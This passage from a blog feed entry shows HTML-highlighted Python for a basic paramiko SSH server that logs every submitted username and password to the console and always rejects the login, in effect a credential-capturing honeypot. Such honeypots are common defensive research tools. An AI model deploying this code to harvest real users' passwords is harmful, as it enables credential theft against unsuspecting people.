+&lt;span class="n"&gt;host_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RSAKey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test_rsa.key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Server&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ServerInterface&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Paramiko powered SSH Server - basic implementation&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;check_auth_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{}:{}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AUTH_FAILED&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_allowed_auths&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Return a comma separated list of&lt;/span&gt;
+&lt;span class="sd"&gt;        valid auth.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;
+
+
+&lt;span class="c1"&gt;# socket creation&lt;/span&gt;
+&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setsockopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOL_SOCKET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1025&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Listening ...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Transport&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_server_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start_server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SSHException&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# wait for auth&lt;/span&gt;
+&lt;span class="n"&gt;chan&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chan&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;channel lost.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;chan&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</content><category term="python"></category><category term="paramiko"></category><category term="ssh"></category></entry></feed>
